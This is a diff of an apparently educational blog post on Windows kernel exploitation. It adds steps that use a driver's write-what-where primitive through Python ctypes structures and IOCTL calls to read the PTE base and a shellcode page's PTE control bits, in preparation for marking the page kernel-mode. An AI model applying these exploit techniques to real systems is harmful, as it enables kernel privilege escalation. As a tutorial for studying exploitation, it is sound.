@@ -240,7 +240,7 @@ The thought process here is, if we write the base of the PTEs to OUR OWN pointer
 
 Here is how this all looks in Python!
 
-First, we declare a structure (one member for the what value, one member for the where value)
+First, we declare a structure (one member for the "what" value, one member for the "where" value)
 
 ```python
 # Fist structure, for obtaining nt!MiGetPteAddress+0x13 value
@@ -270,7 +270,7 @@ Thirdly, we declare a `c_void_p()` to store the value pointed to by `nt!MiGetPte
 base_of_ptes_pointer = c_void_p()
 ```
 
-Fourthly, we create our structure with our "what" value and our "where" value which writes what the actual address of `nt!MiGetPteAddress+0x13` points to (the base of the PTEs) into our declared pointer.
+Fourthly, we initialize our structure with our "what" value and our "where" value which writes what the actual address of `nt!MiGetPteAddress+0x13` points to (the base of the PTEs) into our declared pointer.
 
 ```python
 # Write-what-where structure #1
@@ -280,7 +280,11 @@ www_pte_base.Where_PTE_Base = addressof(base_of_ptes_pointer)
 www_pte_pointer = pointer(www_pte_base)
 ```
 
-Then, we make an IOCTL call to the routine that jumps to the arbitrary write in the driver.
+Notice the where is the address of the pointer `addressof(base_of_ptes_pointer)`. This is because we don't want to overwrite the `c_void_p`'s address with anything- we want to store the value inside of the pointer.
+
+This will store the value inside of the pointer because our write-what-where primtive writes a "what" value to a pointer.
+
+Next, we make an IOCTL call to the routine that jumps to the arbitrary write in the driver.
 
 ```python
 # 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
@@ -314,4 +318,43 @@ Utilizing the base of the PTEs, we can now dynamically retrieve the location of 
 Read, Read, Read... Again!
 ---
 
-Now that we have dynamically resolved 
+Now that we have dynamically resolved the PTE for our shellcode, we need to use our arbitrary read again to dereference the shellcode's PTE and extract the PTE control bits so we can modify the page table entry to be kernel mode.
+
+Using the same primtive as above, we can use Python again to dynamically retrieve all of this!
+
+Firstly, we need to create another structure (again, one member for "what" and one member for "where").
+
+```python
+# Second structure, for obtaining the control bits for the PTE
+class WriteWhatWhere_PTE_Control_Bits(Structure):
+    _fields_ = [
+        ("What_PTE_Control_Bits", c_void_p),
+        ("Where_PTE_Control_Bits", c_void_p)
+    ]
+```
+
+Secondly, we declare another `c_void_p`.
+
+```python
+shellcode_pte_bits_pointer = c_void_p()
+```
+
+Thirdly, we initialize our structure with the appropriate variables
+
+```python
+# Write-what-where structure #2
+www_pte_bits = WriteWhatWhere_PTE_Control_Bits()
+www_pte_bits.What_PTE_Control_Bits = shellcode_pte
+www_pte_bits.Where_PTE_Control_Bits = addressof(shellcode_pte_bits_pointer)
+www_pte_bits_pointer = pointer(www_pte_bits)
+```
+
+We then make another call to the IOCTL responsible for the vulnerability.
+
+Before executing our updated exploit, let's restart the computer to prove everything is working dynamically.
+
+Our combined code executes- resulting in the extraction of the PTE control bits!
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_16.png" alt="">
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/PTE_15.png" alt="">
